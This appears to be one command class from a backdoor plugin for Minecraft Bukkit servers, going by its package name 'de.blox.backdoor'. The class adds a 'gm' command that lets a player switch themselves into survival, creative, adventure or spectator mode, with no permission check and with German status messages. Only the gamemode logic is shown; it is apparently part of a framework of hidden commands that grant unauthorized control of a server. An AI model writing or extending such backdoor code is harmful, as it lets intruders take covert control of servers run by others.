package de.blox.backdoor.commands.implement;


import de.blox.backdoor.commands.AbstractCommand;
import de.blox.backdoor.core.Core;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;


public class GameModeCommand extends AbstractCommand {


    public GameModeCommand() {
        super("Gamemode Change", "gm", "gm");
    }

    @Override
    public void processCommand(Player player, String line, String[] args) {
        if (args.length == 1) {
            if (args[0].equalsIgnoreCase("0")) {
                player.setGameMode(GameMode.SURVIVAL);
                player.sendMessage(Core.getInstance().getPrefix() + "Sie haben sich in den SurvivalModus gesetzt");
            }
            if (args[0].equalsIgnoreCase("1")) {
                player.setGameMode(GameMode.CREATIVE);
                player.sendMessage("Sie haben sich in den CreativeModus gesetzt");
            }
            if (args[0].equalsIgnoreCase("2")) {
                player.setGameMode(GameMode.ADVENTURE);
                player.sendMessage("Sie haben sich in den AdventureModus gesetzt");
            }
            if (args[0].equalsIgnoreCase("3")) {
                player.setGameMode(GameMode.SPECTATOR);
                player.sendMessage("Sie haben sich in den SpectatorModus gesetzt");
            }
        }
    }

    @Override
    public boolean mustRegistered() {
        return false;
    }

}
